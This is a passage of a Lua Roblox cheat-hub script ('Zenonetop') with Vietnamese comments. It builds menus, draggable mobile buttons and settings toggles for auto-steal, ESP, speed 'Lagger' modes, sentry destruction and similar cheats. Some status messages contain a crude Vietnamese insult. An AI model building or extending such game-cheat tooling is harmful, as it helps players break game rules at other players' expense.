	pcall(function() setSpamPaint(false) end)
	if type(setAutoSteal) == "function" then
 pcall(function() setAutoSteal(false) end)
	end
	-- sync toggle UI
	local defs = {
 antiGummy = true, antiRagdoll = false, antiPaint = true, antiBoogie = true,
 toolAim = true, infJump = true, destroySentry = false, speedOn = true,
 mobileBtns = true, guiLock = false,
 esp = false, tracer = false, antiLag = false,
 spamLaser = false, spamPaint = false,
 autoSteal = false, stealPause = false, showTPPanel = true,
	}
	for k, v in pairs(defs) do
 if ToggleRefs[k] and ToggleRefs[k].set then
 pcall(function() ToggleRefs[k].set(v) end)
 end
	end
	if _G.ZenonetopResetMobilePos then pcall(_G.ZenonetopResetMobilePos) end
	if _G.ZenonetopApplyMobile then pcall(_G.ZenonetopApplyMobile) end
	if _G.ZenonetopRefreshModeCards then pcall(_G.ZenonetopRefreshModeCards) end
	pcall(applyMenuScale)
	if _G.ZenonetopSyncAutoSteal then pcall(_G.ZenonetopSyncAutoSteal) end
	pcall(saveCfg)
	showToast("RESET ALL ✓ Free Sell La Tuat Ngu Lon")
end, 32)
actionBtn(pageSet, "Save Now", C.accent, function()
	-- snapshot vị trí menu / mini / bar trước khi ghi
	pcall(function()
 if Main then
 St._mainPos = {Main.Position.X.Scale, Main.Position.X.Offset, Main.Position.Y.Scale, Main.Position.Y.Offset}
 end
 local mini = PlayerGui:FindFirstChild("ZenonetopHubFullMini")
 local mb = mini and mini:FindFirstChildWhichIsA("GuiObject")
 if mb then
 St._miniPos = {mb.Position.X.Scale, mb.Position.X.Offset, mb.Position.Y.Scale, mb.Position.Y.Offset}
 end
 St.menuOpen = Main and Main.Visible == true
	end)
	local ok = saveCfg()
	if ok then
 showToast("SAVED ✓ Free Sell La Tuat Ngu Lon")
	else
 showToast("SAVE FAIL (no writefile?)")
	end
end, 33)

----------------------------------------------------------------
-- MINI + CLOSE (no keybind)
----------------------------------------------------------------
local MiniGui = Instance.new("ScreenGui")
MiniGui.Name = "ZenonetopHubFullMini"
MiniGui.ResetOnSpawn = false
MiniGui.IgnoreGuiInset = true
MiniGui.DisplayOrder = 121
MiniGui.Parent = PlayerGui
-- Helper tròn khi menu ẩn (LKZ style) — kéo được, ấn mở menu
local Mini = Instance.new("TextButton")
Mini.Size = UDim2.new(0, 110, 0, 36)
Mini.Position = UDim2.new(0, 14, 0, 90)
Mini.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
Mini.Text = "ZENONETOP"
Mini.TextColor3 = C.accent
Mini.TextSize = 12
Mini.Font = Enum.Font.GothamBold
Mini.Visible = false
Mini.AutoButtonColor = false
Mini.Parent = MiniGui
corner(Mini, 8)
local miniStroke = Instance.new("UIStroke", Mini)
miniStroke.Color = C.accent
miniStroke.Thickness = 2
miniStroke.Transparency = 0.15

do
	local dragging, dragStart, startPos, moved
	Top.InputBegan:Connect(function(input)
 if St.guiLock then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 dragStart = input.Position
 startPos = Main.Position
 input.Changed:Connect(function()
 if input.UserInputState == Enum.UserInputState.End then
 dragging = false
 St._mainPos = {Main.Position.X.Scale, Main.Position.X.Offset, Main.Position.Y.Scale, Main.Position.Y.Offset}
 St.menuOpen = Main.Visible == true
 pcall(saveCfg)
 end
 end)
 end
	end)
	UIS.InputChanged:Connect(function(input)
 if dragging and not St.guiLock and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
 local d = input.Position - dragStart
 Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
	end)
end
do
	local dragging, dragStart, startPos, moved
	-- Load vị trí nút đóng/mở đã lưu
	pcall(function()
 local p = St._miniPos
 if type(p) == "table" and p[1] ~= nil then
 Mini.Position = UDim2.new(p[1], p[2], p[3], p[4])
 end
	end)
	Mini.InputBegan:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 moved = false
 dragStart = input.Position
 startPos = Mini.Position
 end
	end)
	UIS.InputChanged:Connect(function(input)
 if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
 local d = input.Position - dragStart
 if math.abs(d.X) > 5 or math.abs(d.Y) > 5 then moved = true end
 if moved then
 Mini.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end
	end)
	UIS.InputEnded:Connect(function(input)
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
 if not dragging then return end
 dragging = false
 if moved then
 St._miniPos = {Mini.Position.X.Scale, Mini.Position.X.Offset, Mini.Position.Y.Scale, Mini.Position.Y.Offset}
 pcall(saveCfg)
 end
	end)
	Mini.MouseButton1Click:Connect(function()
 if moved then return end -- vừa kéo xong không mở menu
 St.menuOpen = true
 saveCfg()
 if moved then return end
 openMenu()
	end)
end

function openMenu()
	Main.Visible = true
	Mini.Visible = false
	St.menuOpen = true
	pcall(saveCfg)
	Main.Size = UDim2.new(0, 0, 0, MH)
	TS:Create(Main, TweenInfo.new(0.22, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
 Size = UDim2.new(0, MW, 0, MH),
	}):Play()
end
function closeMenu()
	local tw = TS:Create(Main, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
 Size = UDim2.new(0, 0, 0, MH),
	})
	tw:Play()
	tw.Completed:Connect(function()
 Main.Visible = false
 St.menuOpen = false
 pcall(function()
 if Main and Main.Parent then
 St._mainPos = {Main.Position.X.Scale, Main.Position.X.Offset, Main.Position.Y.Scale, Main.Position.Y.Offset}
 end
 end)
 Mini.Visible = true
 Mini.Text = "ZENONETOP"
 -- Giữ vị trí mini đã lưu; nếu chưa có thì đặt gần chỗ menu
 pcall(function()
 local p = St._miniPos
 if type(p) == "table" and p[1] ~= nil then
 Mini.Position = UDim2.new(p[1], p[2], p[3], p[4])
 else
 Mini.Position = UDim2.new(Main.Position.X.Scale, Main.Position.X.Offset + 8, Main.Position.Y.Scale, Main.Position.Y.Offset)
 St._miniPos = {Mini.Position.X.Scale, Mini.Position.X.Offset, Mini.Position.Y.Scale, Mini.Position.Y.Offset}
 end
 end)
 pcall(saveCfg)
	end)
end
CloseBtn.Active = true
CloseBtn.ZIndex = 50
CloseBtn.MouseButton1Click:Connect(closeMenu)
CloseBtn.Activated:Connect(closeMenu)
if Helper then
	Helper.MouseButton1Click:Connect(closeMenu)
	pcall(function() Helper.Activated:Connect(closeMenu) end)
end

----------------------------------------------------------------
-- MOBILE: 3 mode + Drop + Insta + TP
----------------------------------------------------------------
local ModeGui = Instance.new("ScreenGui")
ModeGui.Name = "ZenonetopHubModeBar"
ModeGui.ResetOnSpawn = false
ModeGui.IgnoreGuiInset = true
ModeGui.DisplayOrder = 2501
ModeGui.Enabled = false
ModeGui.Parent = PlayerGui

local ActGui = Instance.new("ScreenGui")
ActGui.Name = "ZenonetopHubActionButtons"
ActGui.ResetOnSpawn = false
ActGui.IgnoreGuiInset = true
ActGui.DisplayOrder = 2500
ActGui.Enabled = false
ActGui.Parent = PlayerGui

local modeRefs = {}
local actRefs = {}

-- Shape chỉ áp dụng cho ACTION buttons (Drop/Insta/TP/Sentry/Steal).
-- 3-mode speed (Normal/Lagger/Custom) LUÔN giữ style mặc định (Pill) như video.
function applyCorner(btn, forceShape)
	if not btn then return end
	local shape = forceShape or St.btnShape or "Square"
	-- Xoá hết UICorner cũ rồi tạo lại (tránh kẹt radius cũ)
	for _, ch in ipairs(btn:GetChildren()) do
 if ch:IsA("UICorner") then pcall(function() ch:Destroy() end) end
	end
	local rad
	if shape == "Round" then
 rad = UDim.new(1, 0) -- tròn
	elseif shape == "Box" then
 rad = UDim.new(0, 12) -- bo vừa
	elseif shape == "Pill" then
 rad = UDim.new(0, 16)
	else
 rad = UDim.new(0, 2) -- Square gần vuông
	end
	local c = Instance.new("UICorner")
	c.Name = "ShapeCorner"
	c.CornerRadius = rad
	c.Parent = btn
	-- đồng bộ ảnh nền / dim
	for _, ch in ipairs(btn:GetChildren()) do
 if ch:IsA("ImageLabel") or (ch:IsA("Frame") and ch.Name ~= "BtnTextOverlay") then
 for _, sub in ipairs(ch:GetChildren()) do
 if sub:IsA("UICorner") then pcall(function() sub:Destroy() end) end
 end
 local c2 = Instance.new("UICorner")
 c2.Name = "ShapeCorner"
 c2.CornerRadius = rad
 c2.Parent = ch
 end
	end
end

function applyCornerToChildren(btn, shape)
	if not btn then return end
	shape = shape or St.btnShape or "Square"
	local rad
	if shape == "Round" then rad = UDim.new(1, 0)
	elseif shape == "Box" then rad = UDim.new(0, 12)
	elseif shape == "Pill" then rad = UDim.new(0, 16)
	else rad = UDim.new(0, 2)
	end
	for _, ch in ipairs(btn:GetChildren()) do
 if ch:IsA("ImageLabel") or (ch:IsA("Frame") and ch.Name ~= "BtnTextOverlay") then
 for _, sub in ipairs(ch:GetChildren()) do
 if sub:IsA("UICorner") then pcall(function() sub:Destroy() end) end
 end
 local c = Instance.new("UICorner")
 c.Name = "ShapeCorner"
 c.CornerRadius = rad
 c.Parent = ch
 end
	end
end

local MOB_BTN_IMAGE_IDS = {
	126832513729779, 81347949983999, 76940707345653, 100648743625857,
	73857705647948, 86237559415852, 81474116937197, 86668822094069,
	108384375206363, 86791880986403, 126414648469223,
}
function applyEmpireBtnBg(btn, index)
	if not btn then return end
	local old = btn:FindFirstChild("BtnBgImage")
	if old then old:Destroy() end
	local list = MOB_BTN_IMAGE_IDS
	local id = list[((tonumber(index) or 1) - 1) % #list + 1]
	if not id or id <= 0 then return end
	-- nền đậm hơn (ZENONETOP style) nhưng chữ vẫn đọc được
	btn.BackgroundTransparency = 0.35
	btn.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
	local bgImg = Instance.new("ImageLabel")
	bgImg.Name = "BtnBgImage"
	bgImg.BackgroundTransparency = 1
	bgImg.Image = "rbxassetid://" .. tostring(id)
	bgImg.ImageTransparency = 0.08 -- đậm hơn (thấp = rõ ảnh hơn)
	bgImg.ScaleType = Enum.ScaleType.Crop
	bgImg.Size = UDim2.new(1, 0, 1, 0)
	bgImg.ZIndex = (btn.ZIndex or 1)
	bgImg.Active = false
	bgImg.Selectable = false
	bgImg.Parent = btn
	-- lớp tối nhẹ để chữ trắng nổi
	local dim = Instance.new("Frame")
	dim.Name = "BtnDim"
	dim.Size = UDim2.new(1, 0, 1, 0)
	dim.BackgroundColor3 = Color3.new(0, 0, 0)
	dim.BackgroundTransparency = 0.45
	dim.BorderSizePixel = 0
	dim.ZIndex = (btn.ZIndex or 1) + 1
	dim.Active = false
	dim.Selectable = false
	dim.Parent = btn
	local rad = UDim.new(1, 0)
	if St.btnShape == "Box" then rad = UDim.new(0, 10)
	elseif St.btnShape == "Square" then rad = UDim.new(0, 4)
	end
	local c = Instance.new("UICorner")
	c.CornerRadius = rad
	c.Parent = bgImg
	local c2 = Instance.new("UICorner")
	c2.CornerRadius = rad
	c2.Parent = dim
	-- chữ trên cùng
	btn.TextTransparency = 0
	btn.TextStrokeTransparency = 0.4
	btn.TextStrokeColor3 = Color3.new(0, 0, 0)
	pcall(function() btn.ZIndex = math.max(btn.ZIndex or 1, 100) end)
	-- Empire gradient stroke on button
	local st = btn:FindFirstChildOfClass("UIStroke")
	if st and not st:FindFirstChild("EmpireOutlineGrad") then
 st.Thickness = 1.6
 st.Transparency = 0.1
 local g = Instance.new("UIGradient")
 g.Name = "EmpireOutlineGrad"
 g.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
 ColorSequenceKeypoint.new(0.35, Color3.fromRGB(255, 80, 180)),
 ColorSequenceKeypoint.new(0.7, Color3.fromRGB(180, 80, 255)),
 ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
 })
 g.Parent = st
 task.spawn(function()
 local t0 = tick()
 while st and st.Parent do
 g.Rotation = ((tick() - t0) * 50) % 360
 task.wait(0.04)
 end
 end)
	end
end

----------------------------------------------------------------
-- SPEED V2 MODE BAR (full GUI from ZENONETOP Clean) — 3 mode
----------------------------------------------------------------
local v2BarButtons = {}
function _G.ZenonetopBuildV2ModeBar()
	pcall(function()
 local old = PlayerGui:FindFirstChild("ZenonetopV2ModeBar")
 if old then old:Destroy() end
	end)
	if not St.mobileBtns then return end
 local sc = math.clamp(tonumber(St.btnScale) or 1, 0.3, 2)
	local modeBase = tonumber(St.btnSizes and St.btnSizes.mode) or 50
	-- Size: Speed 3Mode tăng CHIỀU CAO (height), width giữ vừa đủ chữ
	local V2_BTN_H = math.max(28, math.floor(modeBase * sc))
	local V2_BTN_W = math.max(72, math.floor(88 * sc)) -- rộng ổn định, không phình theo size
	local V2_CORNER = 12	local MODE_COLORS = {
 Normal = {
 onBg = Color3.fromRGB(255, 200, 210), onTxt = Color3.fromRGB(30, 20, 30),
 offBg = Color3.fromRGB(255, 255, 255), offTxt = Color3.fromRGB(25, 25, 30),
 stroke = Color3.fromRGB(255, 160, 180),
 },
 Lagger = {
 onBg = Color3.fromRGB(255, 200, 210), onTxt = Color3.fromRGB(30, 20, 30),
 offBg = Color3.fromRGB(255, 255, 255), offTxt = Color3.fromRGB(25, 25, 30),
 stroke = Color3.fromRGB(255, 160, 180),
 },
 Custom = {
 onBg = Color3.fromRGB(255, 200, 210), onTxt = Color3.fromRGB(30, 20, 30),
 offBg = Color3.fromRGB(255, 255, 255), offTxt = Color3.fromRGB(25, 25, 30),
 stroke = Color3.fromRGB(255, 160, 180),
 },
	}
	local gui = Instance.new("ScreenGui")
	gui.Name = "ZenonetopV2ModeBar"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 95
	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	gui.Parent = PlayerGui
	v2BarButtons = {}
	local function styleV2Btn(btn, modeName, active)
 local col = MODE_COLORS[modeName] or MODE_COLORS.Normal
 btn.BackgroundColor3 = active and col.onBg or col.offBg
 btn.TextColor3 = active and col.onTxt or col.offTxt
 local st = btn:FindFirstChildOfClass("UIStroke")
 if st then
 st.Color = active and col.stroke or Color3.fromRGB(210, 210, 220)
 st.Transparency = active and 0.15 or 0.35
 st.Thickness = active and 1.5 or 1
 end
	end
	local function posFromSaved(modeName, order)
 local key = "V2_" .. modeName
 local t = St._btnPos and St._btnPos[key]
 if type(t) == "table" and t[1] ~= nil then
 return UDim2.new(t[1], t[2], t[3], t[4])
 end
 local gap = 10
 local total = (V2_BTN_W + gap) * 3 - gap
 return UDim2.new(0.5, -total / 2 + (order - 1) * (V2_BTN_W + gap), 1, -118)
	end
	local function saveV2Pos(modeName, holder)
 St._btnPos = St._btnPos or {}
 St._btnPos["V2_" .. modeName] = {
 holder.Position.X.Scale, holder.Position.X.Offset,
 holder.Position.Y.Scale, holder.Position.Y.Offset,
 }
 pcall(saveCfg)
	end
	local function makeV2ModeBtn(modeName, label, order)
 local holder = Instance.new("Frame")
 holder.Name = "V2MH_" .. modeName
 holder.Size = UDim2.new(0, V2_BTN_W, 0, V2_BTN_H)
 holder.Position = posFromSaved(modeName, order)
 holder.BackgroundTransparency = 1
 holder.BorderSizePixel = 0
 holder.ZIndex = 10
 holder.Active = true
 holder.Parent = gui
 local btn = Instance.new("TextButton")
 btn.Name = "V2Bar_" .. modeName
 btn.Size = UDim2.new(1, 0, 1, 0)
 btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 btn.Text = label
 btn.TextColor3 = Color3.fromRGB(25, 25, 30)
 btn.Font = Enum.Font.GothamBlack
 btn.TextSize = 13
 btn.AutoButtonColor = false
 btn.ZIndex = 12
 btn.Parent = holder
 Instance.new("UICorner", btn).CornerRadius = UDim.new(0, V2_CORNER)
 local st = Instance.new("UIStroke", btn)
 st.Thickness = 1
 st.Transparency = 0.35
 st.Color = Color3.fromRGB(210, 210, 220)
 st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 styleV2Btn(btn, modeName, St.activeMode == modeName)
 local activeInput, pressPos, holderStart = nil, nil, nil
 local moved, lastClick = false, 0
 local function runClick()
 local now = tick()
 if now - lastClick < 0.08 then return end
 lastClick = now
 if type(setActiveMode) == "function" then
 setActiveMode(modeName)
 else
 St.activeMode = modeName
 end
 for n, e in pairs(v2BarButtons) do
 if e and e.btn then styleV2Btn(e.btn, n, n == modeName) end
 end
 -- sync old modeRefs if any
 for n, e in pairs(modeRefs or {}) do
 if e and e.style then pcall(e.style, n == modeName)
 elseif e and e.btn then
 e.btn.BackgroundColor3 = (n == modeName) and Color3.fromRGB(255, 200, 210) or Color3.fromRGB(255, 255, 255)
 end
 end
 end
 btn.InputBegan:Connect(function(input)
 if input.UserInputType ~= Enum.UserInputType.Touch and input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
 activeInput = input
 pressPos = input.Position
 holderStart = holder.Position
 moved = false
 input.Changed:Connect(function()
 if input.UserInputState ~= Enum.UserInputState.End or activeInput ~= input then return end
 activeInput = nil
 if not moved then
 runClick()
 elseif not St.guiLock then
 saveV2Pos(modeName, holder)
 end
 end)
 end)
 btn.Activated:Connect(function()
 if moved then return end
 runClick()
 end)
 UIS.InputChanged:Connect(function(input)
 if not activeInput or not pressPos or not holderStart then return end
 if activeInput.UserInputType == Enum.UserInputType.Touch then
 if input ~= activeInput then return end
 elseif activeInput.UserInputType == Enum.UserInputType.MouseButton1 then
 if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
 else return end
 local dx = input.Position.X - pressPos.X
 local dy = input.Position.Y - pressPos.Y
 if math.abs(dx) > 4 or math.abs(dy) > 4 then moved = true end
 if moved and not St.guiLock then
 holder.Position = UDim2.new(holderStart.X.Scale, holderStart.X.Offset + dx, holderStart.Y.Scale, holderStart.Y.Offset + dy)
 end
 end)
 v2BarButtons[modeName] = { holder = holder, btn = btn }
 return btn
	end
	makeV2ModeBtn("Normal", "NORMAL", 1)
	makeV2ModeBtn("Lagger", "LAGGER", 2)
	makeV2ModeBtn("Custom", "CUSTOM", 3)
	_G.ZenonetopRefreshV2ModeBar = function()
 for n, e in pairs(v2BarButtons) do
 if e and e.btn then styleV2Btn(e.btn, n, St.activeMode == n) end
 end
	end
end


function makeModeBtn(name, order)
	-- Size Speed 3Mode: tăng chiều cao; width ổn định
	local sc = tonumber(St.btnScale) or 1
	local modeBase = tonumber(St.btnSizes and St.btnSizes.mode) or 50
	local V2_CORNER = 12
	local h = math.max(28, math.floor(modeBase * sc))
	local w = math.max(72, math.floor(88 * sc))
	local holder = Instance.new("Frame")
	holder.Name = "M_" .. name
	holder.Size = UDim2.new(0, w, 0, h)
	local gap = 10
	local total = (w + gap) * 3 - gap
	holder.Position = UDim2.new(0.5, -total / 2 + (order - 1) * (w + gap), 1, -118)
	holder.BackgroundTransparency = 1
	holder.BorderSizePixel = 0
	holder.ZIndex = 10
	holder.Active = true
	holder.Parent = ModeGui
	-- restore saved pos
	pcall(function()
 local p = St._btnPos and St._btnPos["M_" .. name]
 if type(p) == "table" and p[1] ~= nil then
 holder.Position = UDim2.new(p[1], p[2], p[3], p[4])
 end
	end)
	local btn = Instance.new("TextButton")
	btn.Name = "ModeBtn"
	btn.Size = UDim2.new(1, 0, 1, 0)
	btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	btn.Text = name:upper()
	if name == "Normal" then btn.Text = "NORMAL" end
	btn.TextColor3 = Color3.fromRGB(25, 25, 30)
	btn.Font = Enum.Font.GothamBlack
	btn.TextSize = math.clamp(math.floor(h * 0.36), 11, 14)
	btn.AutoButtonColor = false
	btn.ZIndex = 12
	btn.Active = true
	btn.Parent = holder
	local corner = Instance.new("UICorner", btn)
	corner.CornerRadius = UDim.new(0, V2_CORNER)
	local st = Instance.new("UIStroke", btn)
	st.Thickness = 1
	st.Transparency = 0.35
	st.Color = Color3.fromRGB(210, 210, 220)
	st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	local function styleMode(on)
 if on then
 btn.BackgroundColor3 = Color3.fromRGB(255, 200, 210)
 btn.TextColor3 = Color3.fromRGB(30, 20, 30)
 st.Color = Color3.fromRGB(255, 160, 180)
 st.Transparency = 0.1
 else
 btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 btn.TextColor3 = Color3.fromRGB(25, 25, 30)
 st.Color = Color3.fromRGB(210, 210, 220)
 st.Transparency = 0.35
 end
	end
	styleMode(St.activeMode == name)
	local dragging, dragStart, startPos, moved = false, nil, nil, false
	local movedDistance = 0
	local TAP_MAX = 22
	btn.InputBegan:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 moved = false
 movedDistance = 0
 dragStart = input.Position
 startPos = holder.Position
 end
	end)
	btn.InputChanged:Connect(function(input)
 if not dragging or not dragStart then return end
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 local d = input.Position - dragStart
 movedDistance = d.Magnitude
 if movedDistance > 8 then moved = true end
 if not St.guiLock and moved then
 holder.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end
	end)
	local function pick()
 setActiveMode(name)
 -- refresh all mode styles
 for n, e in pairs(modeRefs) do
 if e and e.btn and e.style then
 e.style(St.activeMode == n)
 elseif e and e.btn then
 local on = St.activeMode == n
 e.btn.BackgroundColor3 = on and Color3.fromRGB(255, 200, 210) or Color3.fromRGB(255, 255, 255)
 e.btn.TextColor3 = on and Color3.fromRGB(30, 20, 30) or Color3.fromRGB(25, 25, 30)
 end
 end
 styleMode(true)
	end
	btn.InputEnded:Connect(function(input)
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
 if not dragging then return end
 dragging = false
 if not moved and movedDistance < TAP_MAX then
 pick()
 elseif moved and not St.guiLock then
 savePos(holder, "M_" .. name)
 end
 movedDistance = 0
 dragStart = nil
	end)
	btn.MouseButton1Click:Connect(function()
 if moved then return end
 pick()
	end)
	btn.Activated:Connect(function()
 if moved then return end
 pick()
	end)
	modeRefs[name] = { holder = holder, btn = btn, style = styleMode }
end


function makeActBtn(key, label, pos, cb)
	-- Mobile button: dễ bấm — steal/sentry/drop/insta/tp cùng độ nhạy
	local baseSz = (St.btnSizes[key] or 50)
	if key == "steal" or key == "sentry" then
 baseSz = math.max(baseSz, 56)
	end
	local sz = math.max(28, math.floor(baseSz * (St.btnScale or 1)))
	local holder = Instance.new("Frame")
	holder.Name = "A_" .. key
	holder.Size = UDim2.new(0, sz, 0, sz)
	holder.Position = pos
	holder.BackgroundTransparency = 1
	holder.Active = true -- nhận touch
	holder.ZIndex = 50
	holder.Parent = ActGui
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, 0, 1, 0)
	btn.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
	btn.Text = label
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.TextSize = math.clamp(math.floor(sz * 0.22), 10, 16)
	btn.Font = Enum.Font.GothamBold
	btn.TextWrapped = true
	btn.AutoButtonColor = false
	btn.Active = true
	btn.Selectable = true
	btn.Modal = false
	btn.ZIndex = 100
	btn.Parent = holder
	-- Action buttons: shape từ Settings (Round/Box/Square)
	applyCorner(btn, St.btnShape)
	do
 local oldS = btn:FindFirstChildOfClass("UIStroke")
 if oldS then oldS:Destroy() end
 local s = Instance.new("UIStroke")
 s.Name = "BtnBorder"
 s.Color = Color3.fromRGB(220, 220, 235)
 s.Thickness = 2
 s.Transparency = 0.15
 s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 s.Parent = btn
	end
	applyEmpireBtnBg(btn, ({drop=1,insta=2,tp=3,sentry=4,steal=5})[key] or 5)
	applyCornerToChildren(btn, St.btnShape)
	local bgImg = btn:FindFirstChild("BtnBgImage")
	if bgImg then
 bgImg.Active = false
 bgImg.Selectable = false
 bgImg.ZIndex = 0
	end
	-- Chữ luôn hiện: TextButton text + label đè trên ảnh
	btn.TextTransparency = 0
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	local oldL = btn:FindFirstChild("BtnTextOverlay")
	if oldL then oldL:Destroy() end
	local tl = Instance.new("TextLabel")
	tl.Name = "BtnTextOverlay"
	tl.BackgroundTransparency = 1
	tl.Size = UDim2.new(1, -4, 1, -4)
	tl.Position = UDim2.new(0, 2, 0, 2)
	tl.Text = label
	tl.TextColor3 = Color3.fromRGB(255, 255, 255)
	tl.TextStrokeTransparency = 0.35
	tl.TextStrokeColor3 = Color3.new(0, 0, 0)
	tl.Font = Enum.Font.GothamBold
	tl.TextScaled = true
	tl.TextWrapped = true
	tl.ZIndex = (btn.ZIndex or 100) + 5
	tl.Active = false
	tl.Parent = btn
	-- ẩn text gốc tránh double (giữ overlay)
	btn.TextTransparency = 1
	local dragging, dragStart, startPos = false, nil, nil
	local movedDistance = 0
	local TAP_MAX = 22 -- dễ bấm / dễ kéo hơn
	local dragThresh = 8 -- kéo nhạy, không nặng
	btn.InputBegan:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true
 movedDistance = 0
 dragStart = input.Position
 startPos = holder.Position
 end
	end)
	-- UIS global = mượt hơn InputChanged trên button
	UIS.InputChanged:Connect(function(input)
 if not dragging or not dragStart then return end
 if input.UserInputType ~= Enum.UserInputType.MouseMovement and input.UserInputType ~= Enum.UserInputType.Touch then return end
 local d = input.Position - dragStart
 movedDistance = d.Magnitude
 if St.guiLock then return end
 if movedDistance > dragThresh then
 holder.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
	end)
	btn.InputEnded:Connect(function(input)
 if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
 if not dragging then return end
 dragging = false
 local tapLimit = TAP_MAX
 -- steal/sentry/drop/insta/tp: dễ bấm hơn
 if key == "steal" or key == "sentry" or key == "drop" or key == "insta" or key == "tp" then
 tapLimit = 48
 end
 if movedDistance < tapLimit then
 if cb then
 btn:SetAttribute("_lastTap", tick())
 pcall(cb)
 if key == "sentry" then
 if _G.ZenonetopRefreshSentryBtn then pcall(_G.ZenonetopRefreshSentryBtn) end
 elseif key == "steal" then
 if _G.ZenonetopRefreshStealBtn then pcall(_G.ZenonetopRefreshStealBtn) end
 end
 end
 else
 if not St.guiLock then
 savePos(holder, "A_" .. key)
 end
 end
 movedDistance = 0
 dragStart = nil
	end)
	local function backupClick()
 local last = btn:GetAttribute("_lastTap") or 0
 if tick() - last < 0.15 then return end
 btn:SetAttribute("_lastTap", tick())
 if cb then pcall(cb) end
 if key == "sentry" and _G.ZenonetopRefreshSentryBtn then pcall(_G.ZenonetopRefreshSentryBtn) end
 if key == "steal" and _G.ZenonetopRefreshStealBtn then pcall(_G.ZenonetopRefreshStealBtn) end
	end
	btn.MouseButton1Click:Connect(backupClick)
	btn.Activated:Connect(backupClick)
	-- overlay không chặn click
	local ov = btn:FindFirstChild("BtnTextOverlay")
	if ov then ov.Active = false; ov.Selectable = false end

	-- STEAL / SENTRY: phản hồi ngay + màu xanh đậm
	if key == "steal" or key == "sentry" then
 local function instantToggle()
 local last = btn:GetAttribute("_lastTap") or 0
 if tick() - last < 0.12 then return end
 btn:SetAttribute("_lastTap", tick())
 if key == "steal" then
 local on = not (St.autoSteal == true)
 if type(setAutoSteal) == "function" then pcall(setAutoSteal, on)
 elseif type(_G.setAutoSteal) == "function" then pcall(_G.setAutoSteal, on)
 else
 St.autoSteal = on
 autoStealEnabled = on
 if on and type(startAutoSteal)=="function" then pcall(startAutoSteal)
 elseif (not on) and type(stopAutoSteal)=="function" then pcall(stopAutoSteal) end
 end
 applyActBtnState(btn, St.autoSteal == true, "STEAL\nON", "AUTO\nSTEAL")
 if _G.ZenonetopRefreshStealBtn then pcall(_G.ZenonetopRefreshStealBtn) end
 else
 local on = not (St.destroySentry == true)
 if type(setDestroySentry) == "function" then pcall(setDestroySentry, on)
 else St.destroySentry = on end
 applyActBtnState(btn, St.destroySentry == true, "SENTRY\nON", "SENTRY")
 if _G.ZenonetopRefreshSentryBtn then pcall(_G.ZenonetopRefreshSentryBtn) end
 end
 end
 btn.MouseButton1Down:Connect(instantToggle)
 btn.TouchTap:Connect(function() end) -- ensure touch focus
 -- thay cb để InputEnded cũng dùng logic này
 cb = instantToggle
	end

	actRefs[key] = { holder = holder, btn = btn }
end

function restorePos(holder, key, defaultPos)
	local t = St._btnPos and St._btnPos[key]
	if type(t) == "table" and t[1] ~= nil then
 holder.Position = UDim2.new(tonumber(t[1]) or 0, tonumber(t[2]) or 0, tonumber(t[3]) or 0, tonumber(t[4]) or 0)
 if t[5] and t[6] then
 local s = tonumber(t[5])
 local h = tonumber(t[6])
 if s and h and s > 10 and h > 10 then
 holder.Size = UDim2.new(0, s, 0, h)
 end
 end
	elseif defaultPos then
 holder.Position = defaultPos
	end
end

function savePos(holder, key)
	St._btnPos = St._btnPos or {}
	St._btnPos[key] = {
 holder.Position.X.Scale, holder.Position.X.Offset,
 holder.Position.Y.Scale, holder.Position.Y.Offset,
 holder.Size.X.Offset, holder.Size.Y.Offset
	}
	saveCfg()
end

function rebuildMobile()
	for _, e in pairs(modeRefs) do if e.holder then e.holder:Destroy() end end
	for _, e in pairs(actRefs) do if e.holder then e.holder:Destroy() end end
	modeRefs, actRefs = {}, {}
